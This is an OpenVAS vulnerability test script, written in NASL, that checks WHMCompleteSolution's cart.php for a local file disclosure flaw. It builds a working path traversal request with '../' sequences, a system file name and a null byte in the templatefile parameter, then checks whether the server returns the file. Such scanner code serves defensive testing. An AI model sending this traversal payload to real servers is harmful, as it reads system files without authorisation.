###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_WHMCompleteSolution.nasl 3117 2016-04-19 10:19:37Z benallard $
#
# WHMCompleteSolution 'cart.php' Local File Disclosure Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "WHMCompleteSolution is prone to a local file-disclosure vulnerability
because it fails to adequately validate user-supplied input.

Exploiting this vulnerability would allow an attacker to obtain
potentially sensitive information from local files on computers
running the vulnerable application. This may aid in further attacks.

Versions prior to WHMCompleteSolution 4.5 are vulnerable.";

tag_solution = "The vendor has released updates. Please see the references for
details.";

if (description)
{
 script_id(103305);
 script_version("$Revision: 3117 $");
 script_tag(name:"last_modification", value:"$Date: 2016-04-19 12:19:37 +0200 (Tue, 19 Apr 2016) $");
 script_tag(name:"creation_date", value:"2011-10-20 15:15:44 +0200 (Thu, 20 Oct 2011)");
 script_bugtraq_id(50280);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_name("WHMCompleteSolution 'cart.php' Local File Disclosure Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/50280");
 script_xref(name : "URL" , value : "http://whmcs.com/");
 script_xref(name : "URL" , value : "http://forum.whmcs.com/showthread.php?t=42121");

 script_tag(name:"qod_type", value:"remote_vul");
 script_summary("Determine if WHMCompleteSolution is prone to a local file-disclosure vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dirs = make_list("/cart","/shop",cgi_dirs());
files = traversal_files();

foreach dir (dirs) {

  foreach file (keys(files)) {
   
    url = string(dir,"/cart.php?a=test&templatefile=",crap(data:"../",length:9*3),files[file],"%00"); 

    if(http_vuln_check(port:port, url:url,pattern:file,extra_check:"WHMCompleteSolution")) {
     
      security_message(port:port);
      exit(0);

    }
  }
}
exit(0);

